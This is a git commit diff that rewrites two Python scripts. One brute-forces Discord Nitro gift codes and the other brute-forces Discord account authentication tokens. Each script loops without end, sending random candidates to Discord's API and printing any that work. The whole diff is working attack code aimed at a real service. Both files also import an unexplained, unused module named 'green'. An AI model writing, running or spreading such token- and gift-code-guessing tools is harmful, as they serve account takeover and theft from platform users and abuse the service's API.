b35b3ff659da824508f2d75b12514caa881ecfac
uhuhuhuhuhuhuhuh <73152542+uhuhuhuhuhuhuhuh@users.noreply.github.com>
2021-04-04 17:15:29 -0400

    Add files via upload

--- download/nitro-gen.py
+++ download/nitro-gen.py
@@ -1,17 +1,43 @@
-import random, string, requests, urllib.request, urllib, urllib.parse, colorama
+import random, string, requests, urllib.request, urllib, urllib.parse, colorama, os, threading, green
 from colorama import Fore as C
 from colorama import Style as S
+from threading import Thread
+os.system("")
 
-def gen():
-	code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
-	return(code)
+class style():
+    BLACK = '\033[30m'
+    RED = '\033[31m'
+    GREEN = '\033[32m'
+    YELLOW = '\033[33m'
+    BLUE = '\033[34m'
+    MAGENTA = '\033[35m'
+    CYAN = '\033[36m'
+    WHITE = '\033[37m'
+    UNDERLINE = '\033[4m'
+    RESET = '\033[0m'
+    
+def gencode():
+	letters = string.ascii_letters + string.digits
+	return ''.join(random.choice(letters) for i in range(16))
 
-url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + gen + "?with_application=false&with_subscription_plan=true"
-r = requests.get(url ,proxies=urllib.request.getproxies())
-amount = int(input('Amount of nitro codes to try: '))
 
-for _i in range(amount):
-    if r.status_code == 200:
-     print(style.GREEN + f"https://discord.gift/{gen} is valid")
-    else:
-     print(style.RED + f"https://discord.gift/{code} is invalid")
+class NitroGenerator:
+	def __init__(self):
+		self.codes = []
+		self.check()
+	
+	def check(self):
+		while True:
+			code = gencode()
+			self.codes.append(code)
+			response = requests.get(
+				"https://discord.com/api/v7/entitlements/gift-codes/" + code + "?with_application=false&with_subscription_plan=true")
+			data = response.json()
+			if response.status_code == 200:
+				print(style.RED + "Worked: " + code)
+			else:
+				print(style.GREEN + "invalid: " + code)
+
+
+
+NitroGenerator()
--- download/token-gen.py
+++ download/token-gen.py
@@ -1,8 +1,8 @@
-import random, string, requests, urllib.request, urllib, urllib.parse, colorama, os, base64
+import random, string, requests, urllib.request, urllib, urllib.parse, colorama, os, base64, threading, green
 from colorama import Fore as C
 from colorama import Style as S
 from random import randint
-
+from threading import Thread
 os.system("")
 
 class style():
@@ -18,24 +18,33 @@ class style():
     RESET = '\033[0m'
     
 
-sample_string = str(randint(000000000000000000, 999999999999999999))
+sample_string = str(random.randint(000000000000000000,999999999999999999))
 sample_string_bytes = sample_string.encode("ascii")
 base64_bytes = base64.b64encode(sample_string_bytes)
 base64_string = base64_bytes.decode("ascii")
 
 def gen():
-	tk = base64_string+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits)
-                                                                                      for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
-	return(tk)
-header = {
-    "Content-Type": "application/json",
-    "authorization": gen
-}
-r = requests.get("https://discordapp.com/api/v6/users/@me/library", headers=header, proxies=urllib.request.getproxies())
-amount = int(input('Amount of tokens to try: '))
+ return base64_string+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
 
-for _i in range(amount):
-    if r.status_code == 200:
-     print(style.GREEN +f"{gen} is valid")
-    else:
-     print(style.RED +f"{gen} is invalid")
+class NitroGenerator:
+	def __init__(self):
+		self.codes = []
+		self.check()
+	
+	def check(self):
+		while True:
+			tk = gen()
+			self.codes.append(tk)
+			header = {
+			"Content-Type": "application/json",
+			"Authorization": f"{tk}"
+			}
+			r = requests.get("https://discordapp.com/api/v6/users/@me/library", headers=header, proxies=urllib.request.getproxies())
+			if r.status_code == 200:
+				print(style.GREEN + "Worked: " + tk)
+			else:
+				print(style.RED + "invalid: " + tk)
+
+
+
+NitroGenerator()
